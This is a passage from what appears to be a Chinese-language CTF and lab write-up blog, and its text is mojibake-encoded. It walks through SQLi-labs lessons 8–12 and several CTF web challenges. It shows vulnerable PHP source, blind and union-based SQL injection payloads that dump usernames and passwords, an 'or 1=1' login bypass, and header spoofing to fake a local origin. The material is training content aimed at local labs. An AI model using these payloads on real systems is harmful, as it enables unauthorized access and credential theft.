class="line">&#125;</span><br></pre></td></tr></table></figure><p>â€‹    åŒæ ·çš„ä¹Ÿæ˜¯ç›²æ³¨ï¼Œåªä¸è¿‡æ”¹å˜äº†é—­åˆæ¡ä»¶ï¼Œæ”¹å˜ä¸€ä¸‹æˆ‘ä»¬çš„pyç¨‹åºï¼š</p><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/picx-images-hosting@master/20230705/St2iv8rimage.5ra403eucl00.png"></p><h1 id="Less-8"><a href="#Less-8" class="headerlink" title="Less-8"></a>Less-8</h1><blockquote><p>Less-8 Blind- Boolian- Single Quotes- String</p></blockquote><p>åŒLess-5ï¼Œä½†æ˜¯ç¦ç”¨äº†æŠ¥é”™æ³¨å…¥ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=&#x27;<span class="subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;</span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$con1</span>, <span class="variable">$sql</span>);</span><br><span class="line"><span class="variable">$row</span> = <span class="title function_ invoke__">mysqli_fetch_array</span>(<span class="variable">$result</span>, MYSQLI_BOTH);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$row</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&#x27;&lt;font size=&quot;5&quot; color=&quot;#FFFF00&quot;&gt;&#x27;</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&#x27;You are in...........&#x27;</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;font size=&quot;5&quot; color=&quot;#FFFF00&quot;&gt;&#x27;</span>;</span><br><span class="line"><span class="comment">//echo &#x27;You are in...........&#x27;;</span></span><br><span class="line"><span class="comment">//print_r(mysqli_error($con1));</span></span><br><span class="line"><span class="comment">//echo &quot;You have an error in your SQL syntax&quot;;</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&lt;/font&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#0000ff&quot; font size= 3&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123; <span class="keyword">echo</span> <span class="string">&quot;Please input the ID as parameter with numeric value&quot;</span>;&#125;</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># modified : Boolean_Blind_SQL_Attack()</span></span><br><span class="line">url = <span class="string">&quot;http://localhost/SQLlabs/Less-8/?id=1&#x27; &quot;</span></span><br><span class="line">payload = <span class="string">f&quot;and BINARY substr((select group_concat(username) from users),<span class="subst">&#123;j&#125;</span>,1)=&#x27;<span class="subst">&#123;i&#125;</span>&#x27; --+&quot;</span></span><br></pre></td></tr></table></figure><h1 id="Less-9"><a href="#Less-9" class="headerlink" title="Less-9"></a>Less-9</h1><blockquote><p>Less-9 Blind- Time based- Single Quotes- String</p></blockquote><p>æœ‰ç‚¹å¥‡æ€ªï¼Œä¸‡èƒ½æ¢æµ‹éƒ½èƒ½æ­£å¸¸å›æ˜¾ï¼ŒæŸ¥çœ‹æºç å‘ç°ç½ªé­ç¥¸é¦–å°±æ˜¯æœ¬é¢˜å°†æ— è®ºä½ æŸ¥è¯¢è¯­å¥å†™çš„å¯¹ä¸å¯¹éƒ½åªå›æ˜¾<code>You are in...........</code>ï¼Œè¿™æ ·å°±ç›¸å½“äºç¦ç”¨äº†æŠ¥é”™æ³¨å…¥å’Œå¸ƒå°”ç›²æ³¨ã€‚æ‰€ä»¥è¿™é“é¢˜æˆ‘ä»¬ä½¿ç”¨æ—¶é—´ç›²æ³¨ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=&#x27;<span class="subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;</span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$con1</span>, <span class="variable">$sql</span>);</span><br><span class="line"><span class="variable">$row</span> = <span class="title function_ invoke__">mysqli_fetch_array</span>(<span class="variable">$result</span>, MYSQLI_BOTH);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$row</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&#x27;&lt;font size=&quot;5&quot; color=&quot;#FFFF00&quot;&gt;&#x27;</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&#x27;You are in...........&#x27;</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;font size=&quot;5&quot; color=&quot;#FFFF00&quot;&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;You are in...........&#x27;</span>;</span><br><span class="line"><span class="comment">//print_r(mysqli_error($con1));</span></span><br><span class="line"><span class="comment">//echo &quot;You have an error in your SQL syntax&quot;;</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&lt;/font&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#0000ff&quot; font size= 3&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123; <span class="keyword">echo</span> <span class="string">&quot;Please input the ID as parameter with numeric value&quot;</span>;&#125;</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># modified : Time_Blind_SQL_Attack()</span></span><br><span class="line">url = <span class="string">&quot;http://localhost/SQLlabs/Less-9/?id=1&#x27; &quot;</span></span><br><span class="line">payload = <span class="string">f&quot;and sleep(if(BINARY substr((select group_concat(username) from users),<span class="subst">&#123;j&#125;</span>,1)=&#x27;<span class="subst">&#123;i&#125;</span>&#x27;,2,0)) --+&quot;</span></span><br></pre></td></tr></table></figure><h1 id="Less-10"><a href="#Less-10" class="headerlink" title="Less-10"></a>Less-10</h1><blockquote><p>Less-10 Blind- Time based- Double Quotes- String</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$id</span> = <span class="string">&#x27;&quot;&#x27;</span>.<span class="variable">$id</span>.<span class="string">&#x27;&quot;&#x27;</span>;</span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=<span class="subst">$id</span> LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure><p>åœ¨Less-9çš„åŸºç¡€ä¸ŠæŠŠ<code>?id=1&#39;</code>æ”¹æˆ<code>?id=1&quot;</code>å°±èƒ½è¿‡ã€‚</p><h1 id="Less-11"><a href="#Less-11" class="headerlink" title="Less-11"></a>Less-11</h1><blockquote><p>Post  Less-11- Error Based- String</p></blockquote><p>ç¬¬ä¸€ä¸ªPostç±»å‹çš„æ³¨å…¥ï¼Œä¹Ÿæ›´æ¥è¿‘æ¸—é€æ—¶å€™çš„æ“ä½œã€‚</p><p>æŒ‰ç…§å‰é¢Getå‹çš„æ–¹å¼æ³¨äº†ä¸€é€šï¼Œå‘ç°éƒ½å¤±è´¥äº†çœ‹çœ‹æºç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;uname&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;passwd&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$uname</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;uname&#x27;</span>];</span><br><span class="line"><span class="variable">$passwd</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;passwd&#x27;</span>];</span><br><span class="line"></span><br><span class="line">@<span class="variable">$sql</span>=<span class="string">&quot;SELECT username, password FROM users WHERE username=&#x27;<span class="subst">$uname</span>&#x27; and password=&#x27;<span class="subst">$passwd</span>&#x27; LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure><p>ç»“è®ºï¼šå¯ä»¥ç›´æ¥åœ¨å‰ç«¯æ¡†æ¡†ä¸­è¾“å‡ºä¹Ÿå¯ä»¥ç”¨å·¥å…·Postæäº¤</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">--------------------ä¸‡èƒ½å…¬å¼--------------------</span><br><span class="line">uname=admin&#x27; or &#x27;1&#x27;=&#x27;1 #</span><br><span class="line">&amp;passwd=1</span><br><span class="line">--------------------æŸ¥è¯¢è¯­å¥å˜ä¸º--------------------</span><br><span class="line">&quot;SELECT username, password FROM users WHERE username=&#x27;admin&#x27; or &#x27;1&#x27;=&#x27;1 #&#x27; and password=&#x27;1&#x27; LIMIT 0,1&quot;</span><br><span class="line">--------------------æŸ¥æ•°æ®åº“åå’Œè¡¨å--------------------</span><br><span class="line">uname=-1&#x27; union select database(),group_concat(table_name) from information_schema.tables where table_schema=database() #</span><br><span class="line">&amp;passwd=</span><br><span class="line">--------------------æŸ¥åˆ—å--------------------</span><br><span class="line">uname=-1&#x27; union select 1,group_concat(column_name) from information_schema.columns where table_name = &#x27;users&#x27; and table_schema=database() --+</span><br><span class="line">&amp;passwd=</span><br><span class="line">--------------------æŸ¥åˆ—å†…å®¹--------------------</span><br><span class="line">uname=-1&#x27; union select group_concat(username,&#x27;--&#x27;),group_concat(password,&#x27;--&#x27;) from users #</span><br><span class="line">&amp;passwd=</span><br></pre></td></tr></table></figure><h1 id="Less-12"><a href="#Less-12" class="headerlink" title="Less-12"></a>Less-12</h1><blockquote><p>Post Less-12- Error Based- Double quotes- String</p></blockquote><p>ç›¸å¯¹äºLess-11 æ¢äº†é—­åˆæ¡ä»¶,åªè¦æŠŠLess-11çš„payloadæŠŠ<code>uname=-1&#39;</code>æ”¹æˆ<code>uname=-1&quot;)</code>å°±èƒ½è¿‡ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$uname</span>=<span class="string">&#x27;&quot;&#x27;</span>.<span class="variable">$uname</span>.<span class="string">&#x27;&quot;&#x27;</span>;</span><br><span class="line"><span class="variable">$passwd</span>=<span class="string">&#x27;&quot;&#x27;</span>.<span class="variable">$passwd</span>.<span class="string">&#x27;&quot;&#x27;</span>; </span><br><span class="line">@<span class="variable">$sql</span>=<span class="string">&quot;SELECT username, password FROM users WHERE username=(<span class="subst">$uname</span>) and password=(<span class="subst">$passwd</span>) LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">åŸpayload:admin&quot;) or 1=1 #</span><br><span class="line">å¼•å·åŒ–:  &quot;admin&quot;) or 1=1 #&quot;</span><br><span class="line">æ‹¬å·åŒ–:  (&quot;admin&quot;) or 1=1 #&quot;)</span><br><span class="line">--------------------ç­‰æ•ˆäº--------------------</span><br><span class="line">SELECT username, password FROM users WHERE username=(&quot;admin&quot;) or 1=1 #&quot;) and password=($passwd) LIMIT 0,1</span><br><span class="line">--------------------æŸ¥æ•°æ®åº“åå’Œè¡¨å--------------------</span><br><span class="line">uname=-1&quot;) union select database(),group_concat(table_name) from information_schema.tables where table_schema=database() #</span><br><span class="line">&amp;passwd=</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQLæ³¨å…¥å­¦ä¹  </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DASBOOK-Web</title>
      <link href="/2023/05/26/DASBOOK/"/>
      <url>/2023/05/26/DASBOOK/</url>
      
        <content type="html"><![CDATA[<blockquote><p>æ²¡æœ‰ä»€ä¹ˆé‡å¤´å†æ¥ï¼Œå‡¡èµ°è¿‡çš„è·¯éƒ½ç®—æ•°ï¼(à¸‡ â€¢_â€¢)à¸‡</p></blockquote><span id="more"></span><h2 id="0x0-æå®¢å¤§æŒ‘æˆ˜-2019-Http"><a href="#0x0-æå®¢å¤§æŒ‘æˆ˜-2019-Http" class="headerlink" title="0x0:[æå®¢å¤§æŒ‘æˆ˜ 2019]Http"></a>0x0:[æå®¢å¤§æŒ‘æˆ˜ 2019]Http</h2><p>â€‹    æŸ¥çœ‹ç½‘é¡µæºä»£ç å‘ç°å¯ç–‘è¿æ¥ï¼š</p><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/picx-images-hosting@master/20230526/St2iv8rimage.1rx0se1qmi9s.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># It doesn&#x27;t come from &#x27;https://Sycsecret.buuoj.cn&#x27;</span></span><br><span class="line"></span><br><span class="line">Referer: https://Sycsecret.buuoj.cn</span><br><span class="line"></span><br><span class="line"><span class="comment"># Please use &quot;Syclover&quot; browser</span></span><br><span class="line"></span><br><span class="line">User-Agent: Syclover</span><br><span class="line">    </span><br><span class="line"><span class="comment"># No!!! you can only read this locally!!!</span></span><br><span class="line"></span><br><span class="line">X-Forwarded-For: <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span></span><br></pre></td></tr></table></figure><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/picx-images-hosting@master/20230526/St2iv8rimage.71cfwppd5f40.png"></p><h2 id="0x1-BUU-BURP-COURSE-1"><a href="#0x1-BUU-BURP-COURSE-1" class="headerlink" title="0x1.BUU BURP COURSE 1"></a>0x1.BUU BURP COURSE 1</h2><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/picx-images-hosting@master/20230526/St2iv8rimage.33d2rrwg9aw0.png"></p><p>â€‹    æ·»åŠ <code>X-Forwarded-For: 127.0.0.1</code> è¯·æ±‚å¤´åæ— å›æ˜¾</p><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/picx-images-hosting@master/20230526/St2iv8rimage.6ikafb7k7600.png"></p><p>â€‹    </p><p>æ›´æ¢ä¸º<code>X-Real-IP: 127.0.0.1</code>è¯·æ±‚å¤´ï¼š</p><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/picx-images-hosting@master/20230526/St2iv8rimage.2bzqx0jnawsg.png"></p><p>æŸ¥çœ‹æºä»£ç ï¼š</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;zh-cn&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>ç™»å½•<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot;text-align: center&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span>&gt;</span></span><br><span class="line">        ç”¨æˆ·åï¼š<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span> <span class="attr">value</span>=<span class="string">&quot;admin&quot;</span>/&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">        å¯†ç ï¼š<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;password&quot;</span> <span class="attr">name</span>=<span class="string">&quot;password&quot;</span> <span class="attr">value</span>=<span class="string">&quot;wwoj2wio2jw93ey43eiuwdjnewkndjlwe&quot;</span>/&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;ç™»å½•&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>ç›´æ¥ç™»å½•ä¼šéœ€è¦é‡æ–°éªŒè¯æœ¬åœ°ç™»å½•ï¼Œä½¿ç”¨<code>hackbar</code> Postæ–¹æ³•ä»è€Œå®ç°ç™»å½•ï¼š</p><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/picx-images-hosting@master/20230526/St2iv8rimage.2ro55t0t07y0.png"></p><blockquote><p>X-Forwarded-Foræ˜¯ç”¨äºè®°å½•ä»£ç†ä¿¡æ¯çš„ï¼Œæ¯ç»è¿‡ä¸€çº§ä»£ç†(åŒ¿åä»£ç†é™¤å¤–)ï¼Œä»£ç†æœåŠ¡å™¨éƒ½ä¼šæŠŠè¿™æ¬¡è¯·æ±‚çš„æ¥æºIPè¿½åŠ åœ¨X-Forwarded-Forä¸­</p><p>X-Real-IPï¼Œä¸€èˆ¬åªè®°å½•çœŸå®å‘å‡ºè¯·æ±‚çš„å®¢æˆ·ç«¯IP</p></blockquote><p><a class="link" href="https://blog.csdn.net/weiyuefei/article/details/78687545">X-Forwarded-For å’Œ X-Real-IP çš„åŒºåˆ«<i class="fas fa-external-link-alt"></i></a></p><h2 id="0x2-BJDCTF2020-Mark-loves-cat"><a href="#0x2-BJDCTF2020-Mark-loves-cat" class="headerlink" title="0x2: [BJDCTF2020]Mark loves cat"></a>0x2: [BJDCTF2020]Mark loves cat</h2><h3 id="åˆæ¢é¢˜ç›®"><a href="#åˆæ¢é¢˜ç›®" class="headerlink" title="åˆæ¢é¢˜ç›®"></a>åˆæ¢é¢˜ç›®</h3><p>â€‹    æ‰“å¼€ç¯å¢ƒå‘ç°æ˜¯ä¸€ä¸ªè¿˜ä¸é”™çš„åšå®¢ç½‘ç«™ï¼Œä½†æ˜¯åœ¨æœ«å°¾å‡ºç°äº†ä¸€ä¸ªä¸ä¸»é¢˜éå¸¸ä¸ç¬¦åˆçš„å­—ç¬¦ä¸²<code>dog</code></p><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/picx-images-hosting@master/20230526/St2iv8rimage.10lnttfn8er4.png"></p><p>â€‹    æ—¥å¸¸ç”¨<code>dirsearch</code>æ‰«ä¸€ä¸‹</p><hr><p>â€‹    è¿™é‡Œåé¢è¡¥ä¸Šï¼Œå› ä¸ºæ•°æ®åº“é¡¹ç›®æ‰€ç”¨çš„ç›¸åº”çš„åº“ç‰ˆæœ¬ä¸dirsearchæ‰€éœ€çš„åº“ç‰ˆæœ¬å†²çªï¼Œæ•…å…ˆä¸ä½¿ç”¨dirsearchã€‚</p><hr><h3 id="æºç åˆ†æ"><a href="#æºç åˆ†æ" class="headerlink" title="æºç åˆ†æ"></a>æºç åˆ†æ</h3><p>â€‹    dirsearchæ‰«æåå‘ç°<code>/.git</code> æ•…å­˜åœ¨gitæ³„éœ²æ¼æ´ã€‚</p><p>â€‹    ä½¿ç”¨<code>Githack</code>åˆ©ç”¨æ¼æ´ä¸‹è½½æºç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># from flag.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$flag</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;/flag&#x27;</span>);</span><br></pre></td></tr></table></figure><p>â€‹    è¿™é‡Œæ”¾ä¸€ç‚¹è‡ªå·±çš„å°æ–°è·¯å†ç¨‹ï¼Œå› ä¸ºæˆ‘ä»¬å‘ç°äº†é‚£ä¸²ä¸ç½‘ç«™å¾ˆä¸ç¬¦åˆçš„<code>dog</code>å­—ç¬¦ä¸²åœ¨æœ€æœ«å°¾ï¼Œæ‰€ä»¥æˆ‘ä»¬ç›´æ¥ç¿»åˆ°<code>index.php</code>çš„æœ€åï¼Œæœç„¶å‘ç°äº†æ¼æ´ä»£ç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># from index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$yds</span> = <span class="string">&quot;dog&quot;</span>;</span><br><span class="line"><span class="variable">$is</span> = <span class="string">&quot;cat&quot;</span>;</span><br><span class="line"><span class="variable">$handsome</span> = <span class="string">&#x27;yds&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_POST</span> <span class="keyword">as</span> <span class="variable">$x</span> =&gt; <span class="variable">$y</span>)&#123;</span><br><span class="line">    <span class="variable">$$x</span> = <span class="variable">$y</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$x</span> =&gt; <span class="variable">$y</span>)&#123;</span><br><span class="line">    <span class="variable">$$x</span> = <span class="variable">$$y</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$x</span> =&gt; <span class="variable">$y</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="variable">$x</span> &amp;&amp; <span class="variable">$x</span> !== <span class="string">&#x27;flag&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="variable">$handsome</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>]) &amp;&amp; !<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="variable">$yds</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="string">&#x27;flag&#x27;</span>  || <span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="string">&#x27;flag&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="variable">$is</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;the flag is: &quot;</span>.<span class="variable">$flag</span>;</span><br></pre></td></tr></table></figure><p>è¡¥å……è¯­æ³•çŸ¥è¯†ï¼š</p><ol><li>phpç¨‹åºå¯ä»¥çœç•¥ç»“æŸç¬¦å·<code>?&gt;</code></li><li><a class="link" href="https://www.runoob.com/php/php-get.html">$_GET[â€˜flagâ€™]<i class="fas fa-external-link-alt"></i></a></li><li><a class="link" href="https://www.runoob.com/php/php-post.html">$_POST[â€˜flagâ€™]<i class="fas fa-external-link-alt"></i></a></li><li><a class="link" href="https://www.runoob.com/php/func-misc-exit.html">phpä¸­çš„exitå‡½æ•°<i class="fas fa-external-link-alt"></i></a>ï¼šexit(<em>message</em>)  è¾“å‡ºä¸€æ¡æ¶ˆæ¯ï¼Œå¹¶é€€å‡ºå½“å‰è„šæœ¬ã€‚</li></ol><p>â€‹    å…ˆåˆ†ææœ€ç®€å•çš„ï¼Œè¿™å°±æ˜¯ä¸ºä»€ä¹ˆå¼€å¤´æˆ‘ä»¬ä¼šå‘ç°<code>dog</code>å­—ç¬¦ä¸²ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// å¦‚æœæ—¢æ²¡æœ‰é€šè¿‡flagå‚æ•°è¿›è¡Œgetå’Œpostä¼ å‚å°±ä¼šç›´æ¥exitå¹¶è¾“å‡ºdogå­—ç¬¦ä¸²</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>]) &amp;&amp; !<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="variable">$yds</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>â€‹    å†åˆ†æ<code>exit($is);</code></p><figure 